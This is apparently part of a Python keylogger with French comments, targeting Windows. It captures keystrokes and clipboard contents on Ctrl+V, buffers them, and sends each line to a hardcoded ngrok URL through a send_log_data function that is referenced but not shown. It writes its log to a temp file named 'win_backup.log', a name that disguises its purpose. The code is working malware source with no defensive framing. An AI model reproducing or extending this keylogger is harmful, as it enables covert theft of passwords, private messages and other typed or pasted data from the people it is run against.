import pynput.keyboard
import requests
import time
import threading 
import os
import tempfile 
import sys 
# --- NOUVELLE DEPENDANCE WINDOWS ---
import win32clipboard 
# -----------------------------------

# (Reste de la configuration inchangé...)
NGROK_URL = "http://jeanelle-quintic-lumberingly.ngrok-free.dev" 
INTERVAL_SECONDS = 60 
LOG_FILE = os.path.join(tempfile.gettempdir(), "win_backup.log") 
log_buffer = ""

# Variables pour détecter les combinaisons de touches
is_ctrl_pressed = False 
is_v_pressed = False

# --- Fonction principale modifiée pour la détection ---
def on_press(key):
    global log_buffer
    global is_ctrl_pressed
    global is_v_pressed 
    
    # Détection des touches de contrôle pour les combinaisons
    if key == pynput.keyboard.Key.ctrl_l or key == pynput.keyboard.Key.ctrl_r:
        is_ctrl_pressed = True
        return # Ne logue pas la touche Ctrl
    
    # Détection de la touche V pour la combinaison Ctrl+V
    if key == pynput.keyboard.KeyCode.from_char('v') or key == pynput.keyboard.KeyCode.from_char('V'):
        is_v_pressed = True

    # --- TENTE DE LIRE LE PRESSE-PAPIERS LORSQUE CTRL+V EST DÉTECTÉ ---
    if is_ctrl_pressed and is_v_pressed:
        try:
            win32clipboard.OpenClipboard()
            # Tente de lire le contenu texte
            clipboard_content = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
            win32clipboard.CloseClipboard()
            
            # Décode le contenu (il est souvent en bytes) et l'ajoute au buffer
            log_buffer += "[PASTE_START]" + clipboard_content.decode('utf-8', errors='ignore') + "[PASTE_END]"
            return 
        except Exception:
            # Si le presse-papiers est vide ou ne contient pas de texte
            pass
            
    # --- LOGIQUE DE CAPTURE DE TEXTE ET D'ENVOI (inchangée) ---
    try:
        char = key.char
        log_buffer += char
        
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            log_buffer += " "
            
        elif key == pynput.keyboard.Key.enter:
            log_buffer += "\n"
            
            # Vérification et envoi
            if log_buffer.strip():
                send_log_data(log_buffer)
            
            log_buffer = "" 
            return 

        elif key == pynput.keyboard.Key.backspace:
            if len(log_buffer) > 0:
                log_buffer = log_buffer[:-1]
            return 
            
        else:
            # Ignore les autres touches de contrôle
            return

def on_release(key):
    global is_ctrl_pressed
    global is_v_pressed 

    # Réinitialise l'état de la touche Ctrl ou V lorsque la touche est relâchée
    if key == pynput.keyboard.Key.ctrl_l or key == pynput.keyboard.Key.ctrl_r:
        is_ctrl_pressed = False
    if key == pynput.keyboard.KeyCode.from_char('v') or key == pynput.keyboard.KeyCode.from_char('V'):
        is_v_pressed = False
        
    # Arrête le keylogger uniquement sur la touche ESC (pour les tests).
    if key == pynput.keyboard.Key.esc:
        return False

# (Le reste du script, y compris send_log_data et report, reste inchangé)
# ...
